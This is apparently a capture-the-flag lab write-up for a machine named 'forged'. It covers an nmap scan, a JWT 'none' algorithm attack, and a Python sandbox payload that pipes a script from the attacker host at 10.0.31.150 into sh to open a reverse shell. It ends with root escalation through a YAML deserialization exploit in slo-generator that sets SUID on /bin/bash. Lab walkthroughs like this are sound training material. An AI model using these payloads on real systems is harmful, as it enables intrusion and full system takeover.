## Port Scanning

`nmap -sV -sC -p- -v $IP --open`

## Enumeration

`http://172.16.8.48`

After registering, we can see the application has a **New Project** feature. However, we don’t have the privilege to access it.

![forged 4](/static/images/forged-writeup-images/image4.png)

Looking at the session cookies, we can see it uses a JWT.

https://jwt.io/

![forged 6](/static/images/forged-writeup-images/image6.png)

With this, we can test some JWT-related attacks.

### JWT Hunter

Using the tool Jwt Hunter, we can see the JWT is vulnerable to a **None Attack**.

After copying the payload and pasting it into the session cookies, we gain access to the feature.

## Foot Hold

The **New Project** feature is a Python sandbox, and we gain initial access by sending the following payload:

`evil.py`

```python
__import__('os').popen("curl 10.0.31.150/sh | sh").read()
```

![forged 9](/static/images/forged-writeup-images/image9.png)

Note: I used the payload from https://reverse-shell.sh/yourip:1337

```bash
python3 -m http.server 80
```

![forged 10](/static/images/forged-writeup-images/image10.png)

```bash
nc -lnvp 1337
```

## Privillege Escalation

```bash
sudo -l
```

![forged 12](/static/images/forged-writeup-images/image12.png)

We can run the `slo-generator` binary as root without a password.

After some research, we found there’s a known exploit.

![forged 13](/static/images/forged-writeup-images/image13.png)

To exploit it, just run the following commands:

```python
echo '!!python/object/apply:os.system ["chmod u+s /bin/bash"]' > exploit.yaml
sudo /usr/local/bin/slo-generator migrate -b exploit.yaml
bash -p
```
